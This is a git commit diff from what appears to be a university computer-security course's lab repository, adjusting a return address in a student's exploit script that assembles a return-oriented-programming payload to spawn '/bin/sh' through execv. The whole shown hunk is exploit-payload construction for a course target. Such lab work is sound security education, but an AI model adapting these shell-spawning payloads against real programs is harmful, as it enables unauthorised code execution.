8f1d50d1e1c58a4966552d310c620fd279063954
eecs388 <adwisi@umich.edu>
2024-11-15 20:31:51 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol5.py
+++ sol5.py
@@ -17,7 +17,7 @@ stack_addr = (0x7ffffff68fc8).to_bytes(8, 'little')
 #address for executing ROP gadget to call exec
 execv_addr = (0x7ffffff68fd0).to_bytes(8, 'little')
 #address for gadget instr, which helps to achieve ROP chain 
-return_addr = (0x0000000000401e4c).to_bytes(8, 'little')
+return_addr = (0x0000000000401e50).to_bytes(8, 'little')
 
 
 hacking = bin_sh_str + null_terminator + null_rdi + null_rsi + stack_addr + execv_addr + return_addr
